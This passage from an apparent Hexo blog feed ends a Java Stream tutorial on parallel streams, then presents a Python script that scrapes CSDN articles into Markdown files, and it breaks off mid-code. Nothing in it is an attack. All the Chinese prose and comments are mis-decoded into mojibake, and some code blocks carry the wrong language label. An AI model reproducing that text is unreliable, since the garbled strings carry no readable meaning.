å®ç°çš„è¯å…¶å®ä¼šéå¸¸çš„å¤æ‚ï¼Œå¹¶ä¸”è¦æ±‚ä½ å¯¹å¹¶å‘ç¼–ç¨‹æœ‰è¶³å¤Ÿçš„ç†è§£å’Œè®¤è¯†ã€‚è€Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨Streamçš„è¯ï¼Œæˆ‘ä»¬åªéœ€è¦ä¿®æ”¹ä¸€ä¸ªæ–¹æ³•çš„è°ƒç”¨å°±å¯ä»¥ä½¿ç”¨å¹¶è¡Œæµæ¥å¸®æˆ‘ä»¬å®ç°ï¼Œä»è€Œæé«˜æ•ˆç‡ã€‚</p><p>â€‹parallelæ–¹æ³•å¯ä»¥æŠŠä¸²è¡Œæµè½¬æ¢æˆå¹¶è¡Œæµã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test28</span><span class="hljs-params">()</span> &#123;<br>    Stream&lt;Integer&gt; stream = Stream.of(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>);<br>    <span class="hljs-type">Integer</span> <span class="hljs-variable">sum</span> <span class="hljs-operator">=</span> stream.parallel()<br>            .peek(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Consumer</span>&lt;Integer&gt;() &#123;<br>                <span class="hljs-meta">@Override</span><br>                <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">accept</span><span class="hljs-params">(Integer num)</span> &#123;<br>                    System.out.println(num+Thread.currentThread().getName());<br>                &#125;<br>            &#125;)<br>            .filter(num -&gt; num &gt; <span class="hljs-number">5</span>)<br>            .reduce((result, ele) -&gt; result + ele)<br>            .get();<br>    System.out.println(sum);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>peek()</code>ï¼šååŠ©è°ƒè¯•</p><p>â€‹æ­£å› ä¸º peek() ä¸æ˜¯ä¸€ä¸ªæœ€ç»ˆæ“ä½œï¼Œä¸ä¼šå½±å“â€œå“ªäº›å…ƒç´ ä¼šæµè¿‡â€ï¼Œæ‰€ä»¥ååˆ†é€‚åˆåœ¨è°ƒè¯•çš„æ—¶å€™ï¼Œç”¨æ¥æ‰“å°å‡ºæµç»ç®¡é“çš„å…ƒç´ ã€‚</p><p>ä¹Ÿå¯ä»¥é€šè¿‡parallelStreamç›´æ¥è·å–å¹¶è¡Œæµå¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Author&gt; authors = getAuthors();<br>authors.parallelStream()<br>        .map(author -&gt; author.getAge())<br>        .map(age -&gt; age + <span class="hljs-number">10</span>)<br>        .filter(age-&gt;age&gt;<span class="hljs-number">18</span>)<br>        .map(age-&gt;age+<span class="hljs-number">2</span>)<br>        .forEach(System.out::println);<br></code></pre></td></tr></table></figure><p>ä¸Šé¢ç¬”è®°æ¥è‡ªä¸‰æ›´è‰å ‚ï¼ŒåŠ äº†ä¸€ç‚¹æˆ‘è‡ªå·±çš„ç¬”è®°ã€‚</p><p>è½¬è½½ <a href="https://www.bilibili.com/video/BV1Gh41187uR/?spm_id_from=333.999.0.0&amp;vd_source=a432f7b466d0eab98b92ac7132f5ca5c">ä¸‰æ›´è‰å ‚çš„ä¸ä¼šLambdaè¡¨è¾¾å¼ã€å‡½æ•°å¼ç¼–ç¨‹ï¼Ÿä½ ç¡®å®šèƒ½çœ‹æ‡‚å…¬å¸ä»£ç ï¼Ÿ-java8å‡½æ•°å¼ç¼–ç¨‹å­¦ä¹ ç¬”è®°</a></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
      <tag>åŸºç¡€</tag>
      
      <tag>Stream</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>çˆ¬å–csdnæ–‡ç« ä¿å­˜æˆMD</title>
    <link href="/2022/12/15/%E7%88%AC%E5%8F%96csdn%E6%96%87%E7%AB%A0%E4%BF%9D%E5%AD%98%E6%88%90MD/"/>
    <url>/2022/12/15/%E7%88%AC%E5%8F%96csdn%E6%96%87%E7%AB%A0%E4%BF%9D%E5%AD%98%E6%88%90MD/</url>
    
    <content type="html"><![CDATA[<h1 id="çˆ¬å–csdnæ–‡ç« ä¿å­˜æˆmd"><a class="markdownIt-Anchor" href="#çˆ¬å–csdnæ–‡ç« ä¿å­˜æˆmd"></a> çˆ¬å–csdnæ–‡ç« ä¿å­˜æˆMD</h1><h2 id="å…¨éƒ¨ä»£ç "><a class="markdownIt-Anchor" href="#å…¨éƒ¨ä»£ç "></a> å…¨éƒ¨ä»£ç </h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> html2text<br><span class="hljs-keyword">import</span> html2markdown<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br><br>headers = &#123;<br>    <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27; Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36&#x27;</span>,<br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getTitle</span>(<span class="hljs-params">tree</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    å¾—åˆ°æ–‡ç« çš„æ ‡é¢˜</span><br><span class="hljs-string">    :param tree:</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    titles = tree.xpath(<span class="hljs-string">&#x27;//h1[@id=&quot;articleContentId&quot;]//text()&#x27;</span>)<br>    <span class="hljs-keyword">return</span> titles[<span class="hljs-number">0</span>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">filename_filter</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    åˆ é™¤æ–‡ç« æ ‡é¢˜é‡Œé¢çš„å…³é”®å­—(é€šè¿‡æ–‡ç« æ ‡é¢˜è®¾ç½®mdæ–‡ä»¶å)</span><br><span class="hljs-string">    :param filename:</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    filename = re.sub(<span class="hljs-string">&#x27;[\/:*?&quot;&lt;&gt;|]&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, filename)<br>    <span class="hljs-keyword">return</span> filename<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getMd_Title</span>(<span class="hljs-params">title, url=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    å¾—åˆ°æ ‡é¢˜</span><br><span class="hljs-string">    :param title:</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># [toc]mdè¯­æ³•ï¼Œç”Ÿæˆç›®å½•</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&#x27;[toc]&lt;h1 href=&quot;<span class="hljs-subst">&#123;url&#125;</span>&quot;&gt;<span class="hljs-subst">&#123;title&#125;</span>&lt;/h1&gt; &lt;a href=&quot;<span class="hljs-subst">&#123;url&#125;</span>&quot;&gt;åŸæ–‡é“¾æ¥&lt;/a&gt;&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getContent</span>(<span class="hljs-params">url: <span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    å¾—åˆ°æ–‡ç« å†…å®¹</span><br><span class="hljs-string">    :param url:</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    request = urllib.request.Request(url=url, headers=headers)<br>    <span class="hljs-keyword">try</span>:<br>        response = urllib.request.urlopen(request)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;null&#x27;</span><br>    content = response.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">return</span> content<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getMd_content</span>(<span class="hljs-params">content: <span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    å¾—åˆ°mdæ–‡ä»¶çš„å†…å®¹</span><br><span class="hljs-string">    :param content:</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># åšå®¢æ–‡ç« å†…å®¹ä¿å­˜åœ¨&lt;article&gt;&lt;/article&gt;ä¸­</span><br>    start = content.find(<span class="hljs-string">&#x27;&lt;article&#x27;</span>)<br>    end = content.find(<span class="hljs-string">&#x27;article&gt;&#x27;</span>, start)<br>    <span class="hljs-keyword">return</span> content[start: end + <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;article&gt;&#x27;</span>)]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getOtherurl</span>(<span class="hljs-params">tree</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    å¾—åˆ°ä¸€ç¯‡æ–‡ç« çš„ä¸­é“¾æ¥çš„å…¶ä»–æ–‡ç« </span><br><span class="hljs-string">    :param tree:</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> tree.xpath(<span class="hljs-string">&#x27;//article[@class=&quot;baidu_pl&quot;]//a/@href&#x27;</span>)<br><br><span class="hljs-comment"># åªä¸‹è½½åšå®¢é“¾æ¥å†…å®¹</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">one</span>(<span class="hljs-params">url: <span class="hljs-built_in">str</span>, theFileLocation=<span class="hljs-string">&#x27;G:\ç¬”è®°\Typora\python\çˆ¬è™«\ç¬”è®°\CSDN\\&#x27;</span>, choose=<span class="hljs-string">&#x27;html2text&#x27;</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    å‰CSDNæ–‡ç« è½¬åŒ–ä¸ºmdæ–‡ä»¶ä¿å­˜</span><br><span class="hljs-string">    :param url: åšå®¢url</span><br><span class="hljs-string">    :param theFileLocation: mdæ–‡ä»¶ä¿å­˜ä½ç½®</span><br><span class="hljs-string">    :param choose: htmlè½¬mdåº“é€‰æ‹©</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    content = getContent(url)<br>    <span class="hljs-comment"># é¡µé¢æ²¡æœ‰</span><br>    <span class="hljs-keyword">if</span> content == <span class="hljs-string">&#x27;null&#x27;</span>:<br>        <span class="hljs-keyword">return</span><br>    tree = etree.HTML(content)<br>    title = getTitle(tree)<br>    md_title = getMd_Title(title, url)<br>    md_content = getMd_content(content)<br>    <span class="hljs-keyword">if</span> choose == <span class="hljs-string">&#x27;html2text&#x27;</span>:<br>        markdown = html2text.html2text(md_title + md_content)<br>    <span class="hljs-keyword">else</span>:<br>        markdown = html2markdown.convert(md_title + md_content)<br>    <span class="hljs-comment"># print(markdown)</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(theFileLocation + filename_filter(title) + <span class="hljs-string">&#x27;.md&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        file.write(markdown)<br>    <span class="hljs-built_in">print</span>(title + <span class="hljs-string">&#x27;ä¿å­˜æˆåŠŸï¼&#x27;</span>)<br><br><span class="hljs-comment"># åšå®¢é“¾æ¥å†…å®¹å’Œå†…å®¹ä¸­å…¶ä»–åšå®¢é“¾æ¥å†…å®¹</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">more</span>(<span class="hljs-params">url: <span class="hljs-built_in">str</span>, theFileLocation=<span class="hljs-string">&#x27;G:\ç¬”è®°\Typora\python\çˆ¬è™«\ç¬”è®°\CSDN\\&#x27;</span>, choose=<span class="hljs-string">&#x27;html2text&#x27;</span></span>):<br>    content = getContent(url)<br>    tree = etree.HTML(content)<br>    title = getTitle(tree)<br>    md_title = getMd_Title(title)<br>    md_content = getMd_content(content)<br>    <span class="hljs-keyword">if</span> choose == <span class="hljs-string">&#x27;html2text&#x27;</span>:<br>        markdown = html2text.html2text(md_title + md_content)<br>    <span class="hljs-keyword">else</span>:<br>        markdown = html2markdown.convert(md_title + md_content)<br>    theFileLocation += title<br>    <span class="hljs-comment"># æ”¹æ–‡ä»¶å¤¹æ˜¯å¦å·²ç»å­˜åœ¨</span><br>    exists = os.path.exists(theFileLocation)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> exists:<br>        <span class="hljs-comment"># ä¸å­˜åœ¨ï¼Œåˆ›å»ºæ–‡ä»¶å¤¹</span><br>        os.makedirs(theFileLocation)<br>    theFileLocation += <span class="hljs-string">&#x27;\\&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(theFileLocation + filename_filter(title) + <span class="hljs-string">&#x27;.md&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        file.write(markdown)<br>    <span class="hljs-built_in">print</span>(title + <span class="hljs-string">&#x27;ä¿å­˜æˆåŠŸï¼&#x27;</span>)<br>    <span class="hljs-comment"># å¾—åˆ°æ–‡ç« ä¸­å…¶ä»–csdnè¿æ¥</span><br>    otherurl = getOtherurl(tree)<br>    <span class="hljs-keyword">for</span> ourl <span class="hljs-keyword">in</span> otherurl:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;csdn&#x27;</span> <span class="hljs-keyword">in</span> ourl:<br>            one(ourl, theFileLocation, choose=choose)<br><br><br><br></code></pre></td></tr></table></figure><h2 id="ä»£ç åˆ†æ"><a class="markdownIt-Anchor" href="#ä»£ç åˆ†æ"></a> ä»£ç åˆ†æ</h2><h3 id="è·å–æ–‡ç« æ ‡é¢˜"><a class="markdownIt-Anchor" href="#è·å–æ–‡ç« æ ‡é¢˜"></a> è·å–æ–‡ç« æ ‡é¢˜</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">getTitle</span>(<span class="hljs-params">tree</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    å¾—åˆ°æ–‡ç« çš„æ ‡é¢˜</span><br><span class="hljs-string">    :param tree:</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    titles = tree.xpath(<span class="hljs-string">&#x27;//h1[@id=&quot;articleContentId&quot;]//text()&#x27;</span>)<br>    <span class="hljs-keyword">return</span> titles[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>é€šè¿‡ç½‘é¡µæºä»£ç åˆ†æ</p><p>CSDNä¸­åšå®¢æ–‡ç« åå­—åœ¨<strong>h1æ ‡ç­¾</strong>ä¸­ï¼Œå¹¶ä¸”idå±æ€§å€¼ä¸º<strong>articleContentId</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221215184025376.png" alt="image-20221215184025376" /></p><h3 id="è·å–æ–‡ç« å†…å®¹"><a class="markdownIt-Anchor" href="#è·å–æ–‡ç« å†…å®¹"></a> è·å–æ–‡ç« å†…å®¹</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">getMd_content</span>(<span class="hljs-params">content: <span class="hljs-built_in">str</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    å¾—åˆ°mdæ–‡ä»¶çš„å†…å®¹</span><br><span class="hljs-string">    :param content:</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-comment"># åšå®¢æ–‡ç« å†…å®¹ä¿å­˜åœ¨&lt;article&gt;&lt;/article&gt;ä¸­</span><br>    start = content.find(<span class="hljs-string">&#x27;&lt;article&#x27;</span>)<br>    end = content.find(<span class="hljs-string">&#x27;article&gt;&#x27;</span>, start)<br>    <span class="hljs-keyword">return</span> content[start: end + <span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;article&gt;&#x27;</span>)]<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221215185553219.png" alt="image-20221215185553219" /></p><p>åˆ†æå¯ä»¥å¾—åˆ°ï¼Œæ–‡ç« çš„å†…å®¹å°±æ˜¯åœ¨<code>&lt;article&gt;&lt;/article&gt;</code></p><p>pythonçš„<a href="https://so.csdn.net/so/search?q=xpath&amp;spm=1001.2101.3001.7020">xpath</a>æ²¡æœ‰è·å–divæ ‡ç­¾å†…htmlå†…å®¹çš„åŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯è·å–divæˆ–aæ ‡ç­¾ä¸­çš„innerhtmlã€‚æ‰€ä»¥åªèƒ½æŠŠç½‘é¡µæºç å½“æˆå­—ç¬¦ä¸²å¤„ç†ï¼Œå»æ‰¾æˆ‘ä»¬éœ€è¦çš„é‚£éƒ¨åˆ†å†…å®¹äº†ã€‚</p><p>ä½¿ç”¨<a href="https://so.csdn.net/so/search?q=selenium&amp;urw=">selenium</a>å¯ä»¥å®ç°è·å–divæ ‡ç­¾å†…htmlå†…å®¹çš„åŠŸèƒ½ã€‚</p><p>PSï¼š<code>content = browser.find_element(By.CLASS_NAME, &quot;DocReader-module_content_AcIMy&quot;).get_attribute(&quot;innerHTML&quot;)</code></p><h3 id="åªä¸‹è½½åšå®¢é“¾æ¥å†…å®¹"><a class="markdownIt-Anchor" href="#åªä¸‹è½½åšå®¢é“¾æ¥å†…å®¹"></a> åªä¸‹è½½åšå®¢é“¾æ¥å†…å®¹</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">one</span>(<span class="hljs-params">url: <span class="hljs-built_in">str</span>, theFileLocation=<span class="hljs-string">&#x27;G:\ç¬”è®°\Typora\python\çˆ¬è™«\ç¬”è®°\CSDN\\&#x27;</span>, choose=<span class="hljs-string">&#x27;html2text&#x27;</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    å‰CSDNæ–‡ç« è½¬åŒ–ä¸ºmdæ–‡ä»¶ä¿å­˜</span><br><span class="hljs-string">    :param url: åšå®¢url</span><br><span class="hljs-string">    :param theFileLocation: mdæ–‡ä»¶ä¿å­˜ä½ç½®</span><br><span class="hljs-string">    :param choose: htmlè½¬mdåº“é€‰æ‹©</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    content = getContent(url)<br>    <span class="hljs-comment"># é¡µé¢æ²¡æœ‰</span><br>    <span class="hljs-keyword">if</span> content == <span class="hljs-string">&#x27;null&#x27;</span>:<br>        <span class="hljs-keyword">return</span><br>    tree = etree.HTML(content)<br>    title = getTitle(tree)<br>    md_title = getMd_Title(title, url)<br>    md_content = getMd_content(content)<br>    <span class="hljs-keyword">if</span> choose == <span class="hljs-string">&#x27;html2text&#x27;</span>:<br>        markdown = html2text.html2text(md_title + md_content)<br>    <span class="hljs-keyword">else</span>:<br>        markdown = html2markdown.convert(md_title + md_content)<br>    <span class="hljs-comment"># print(markdown)</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(theFileLocation + filename_filter(title) + <span class="hljs-string">&#x27;.md&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        file.write(markdown)<br>    <span class="hljs-built_in">print</span>(title + <span class="hljs-string">&#x27;ä¿å­˜æˆåŠŸï¼&#x27;</span>)<br></code></pre></td></tr></table></figure><p>æ ¹æ®è¾“å…¥ï¼ˆchooseï¼‰é€‰æ‹©htmlè§£ææˆmdçš„ç±»åº“ï¼ŒæŠŠè·å–çš„htmlä»£ç è½¬åŒ–ä¸ºmdæ ¼å¼</p><p>ä¸ªäººè§‰å¾—<code>html2text</code>å¥½ç”¨äº›</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> choose == <span class="hljs-string">&#x27;html2text&#x27;</span>:<br>    markdown = html2text.html2text(md_title + md_content)<br><span class="hljs-keyword">else</span>:<br>    markdown = html2markdown.convert(md_title + md_content)<br></code></pre></td></tr></table></figure><p>æœ¬åœ°æ–‡ä»¶æŒä¹…åŒ–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(theFileLocation + filename_filter(title) + <span class="hljs-string">&#x27;.md&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(markdown)<br></code></pre></td></tr></table></figure><h3 id="è·å–åšå®¢å†…å®¹ä¸­çš„å…¨éƒ¨é“¾æ¥"><a class="markdownIt-Anchor" href="#è·å–åšå®¢å†…å®¹ä¸­çš„å…¨éƒ¨é“¾æ¥"></a> è·å–åšå®¢å†…å®¹ä¸­çš„å…¨éƒ¨é“¾æ¥</h3><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs julia">def getOtherurl(tree):<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    è·å–åšå®¢å†…å®¹ä¸­çš„å…¨éƒ¨é“¾æ¥</span><br><span class="hljs-string">    :param tree:</span><br><span class="hljs-string">    :return:</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> tree.xpath(&#x27;//article[<span class="hljs-meta">@class</span>=<span class="hljs-string">&quot;baidu_pl&quot;</span>]//a/<span class="hljs-meta">@href</span>&#x27;)<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20221215192934219.png" alt="image-20221215192934219" /></p><p>å‰é¢åˆ†æå¾—æ–‡ç« å†…å®¹å°±æ˜¯åœ¨ <code>&lt;article&gt;&lt;/article&gt;</code></p><p>è·å–<code>&lt;article&gt;&lt;/article&gt;</code>å…¨éƒ¨<code>a</code>å­å…ƒç´ çš„herfå±æ€§å€¼ï¼Œæ—¢å…¶ä»–åšå®¢é“¾æ¥ä¹Ÿè‚¯å®šè¢«è·å–åˆ°</p><h3 id="ä¸‹è½½åšå®¢å†…å®¹å’Œåšå®¢å†…å®¹ä¸­å…¶ä»–é“¾æ¥å†…å®¹åªèƒ½æ˜¯csdnåšå®¢é“¾æ¥"><a class="markdownIt-Anchor" href="#ä¸‹è½½åšå®¢å†…å®¹å’Œåšå®¢å†…å®¹ä¸­å…¶ä»–é“¾æ¥å†…å®¹åªèƒ½æ˜¯csdnåšå®¢é“¾æ¥"></a> ä¸‹è½½åšå®¢å†…å®¹å’Œåšå®¢å†…å®¹ä¸­å…¶ä»–é“¾æ¥å†…å®¹ï¼ˆåªèƒ½æ˜¯csdnåšå®¢é“¾æ¥ï¼‰</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs css"># <br>def more(url: str, theFileLocation=<span class="hljs-string">&#x27;G:\ç¬”è®°\Typora\python\çˆ¬è™«\ç¬”è®°\CSDN\\&#x27;</span>, choose=<span class="hljs-string">&#x27;html2text&#x27;</span>):<br>    content = <span class="hljs-built_in">getContent</span>(url)<br>    tree = etree.<span class="hljs-built_in">HTML</span>(content)<br>    title = <span class="hljs-built_in">getTitle</span>(tree)<br>    md_title = <span 